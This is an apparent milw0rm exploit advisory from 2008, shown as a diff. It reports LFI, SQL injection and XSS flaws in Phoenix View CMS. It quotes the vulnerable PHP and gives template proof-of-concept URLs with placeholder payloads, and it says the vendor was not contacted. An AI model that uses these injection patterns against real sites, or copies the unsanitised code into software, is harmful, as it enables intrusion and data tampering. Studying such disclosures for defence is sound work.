@@ -1,0 +1,144 @@
+#########################################################################################
+Phoenix View CMS <= Pre Alpha2 Multiple Vulnerabilities [LFI][SQLI][XSS]
+#########################################################################################
+
+Found by         : tw8
+Date             : 8.05.2008
+Website && Forum : http://rstzone.org && http://rstzone.org/forum/
+Bug type         : LFI, SQLI & XSS
+#########################################################################################
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application   : Phoenix View CMS
+Version       : <= Pre Alpha2
+Vendor        : http://sourceforge.net/projects/phoenixviewcms/
+Description   :
+
+Phoenix View CMS is going to be an easy to use Content-Managemen-System. It's using a
+self-written Template-Engine. The CMS will use a self-written API and it's gonna be
+easy to write your own plugins and modules.
+########################################################################################
+
+Vulnerabilities:
+~~~~~~~~~~~~~~~
+
+Vulnerable code #1 in admin/admin_frame.php [LFI]+[XSS]:
+
+----------------------------------------------------------------------------
+[code]
+
+	if(isset($_GET["ltarget"])) {
+	$ltarget=$_GET["ltarget"];
+	$_SESSION["lastsecaction"]='';
+}
+......
+	if(!file_exists(SYSTEM_ADMIN_path . "/" . $ltarget . ".php")) {
+		printError("System Admin Seite \"" . $ltarget . "\" wurde nicht gefunden.");
+	}
+	else {
+		include SYSTEM_ADMIN_path . $ltarget . ".php";
+	}
+
+  
+[/code]
+----------------------------------------------------------------------------
+ 
+ POC #1:
+ 
+ http://www.target.com/path/admin/admin_frame.php?ltarget=[LOCAL FILE]%00
+ http://www.target.com/path/admin/admin_frame.php?ltarget=[XSS]
+ 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 
+ Vulnerable code #2 admin/module/*.php [SQLI]:
+
+----------------------------------------------------------------------------
+[code]
+
+	class db {
+	
+......
+	
+	function query($query,$ressave=false) {
+		if($ressave) return mysql_query($query);
+		else {
+			$this->res = mysql_query($query);
+			return $this->res;
+		}
+	}
+......
+}
+......
+	
+	 if(isset($_GET["del"])) {
+	$db->query("DELETE from " . SYSTEM_dbpref . "todo where id='".$_GET["del"]."'");
+	echo "<font color='green'>Löschen erfolgreich</font><br />\n";
+}
+
+/*Vulnerable files:
+gbuch.admin.php
+links.admin.php
+menue.admin.php
+news.admin.php
+todo.admin.php
+*/
+	
+  
+[/code]
+----------------------------------------------------------------------------
+ 
+ POC #2:
+ 
+ http://www.target.com/path/admin/module/vulnerable_file.php?del=[SQLI]
+ 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+ Vulnerable code #3 admin/module/*.php [XSS]:
+
+----------------------------------------------------------------------------
+[code]
+
+	<input type='hidden' name='conf' value='<?php if(isset($_GET["conf"])) echo $_GET["conf"];else echo $_POST["conf"]; ?>' />
+
+/*Vulnerable files:
+gbuch.admin.php
+links.admin.php
+menue.admin.php
+news.admin.php
+todo.admin.php
+*/
+	
+  
+[/code]
+----------------------------------------------------------------------------
+ 
+ POC #3:
+ 
+ http://www.target.com/path/admin/module/vulnerable_file.php?conf=[XSS]
+ 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Status:
+~~~~~~~
+
+Vendor has not been contacted yet.
+
+###########################################################################
+
+Shoutz to vladiii, kw3rln, Nemessis, Kenpachi, Moubik, DranaXum, Inside, str0ke & all RST Members.
+
+###########################################################################
+
+Contact:
+~~~~~~~
+
+     Website: http://rstzone.org
+	 Forum: http://rstzone.org/forum
+     E-Mail: ym_tw8[at]yahoo[dot]com
+
+
+################################ [ EOF ] ##################################
+
+# milw0rm.com [2008-05-09]
